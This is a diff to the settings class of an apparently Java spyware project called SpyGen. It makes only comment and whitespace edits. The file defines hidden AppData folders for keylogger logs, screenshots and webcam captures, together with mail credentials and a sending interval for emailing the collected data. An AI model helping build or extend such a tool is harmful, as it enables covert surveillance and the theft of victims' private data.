@@ -3,19 +3,17 @@ package com.houarizegai.spygen.global;
 import java.io.File;
 
 public class Settings {
-    // Path you want to save results
+    // Path you wanna save results to
     public static String savePath = "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\";
     public static final String APP_NAME = "SpyGen";
     public static final String KEYLOGGER_PATH = savePath + APP_NAME + "/keyloggers/";
     public static final String SCREENSHOT_PATH = savePath + APP_NAME + "/screenshots/";
     public static final String WEBCAM_PATH = savePath + APP_NAME + "/webcam/";
 
-    /* Mail information */
     public static String senderMail;
     public static String senderPassword;
     public static String receiverMail;
 
-    /* Sending information */
     public static int periodSendingSeconds;
 
     static {
@@ -34,5 +32,4 @@ public class Settings {
         if (!directory.exists())
             directory.mkdir();
     }
-
 }
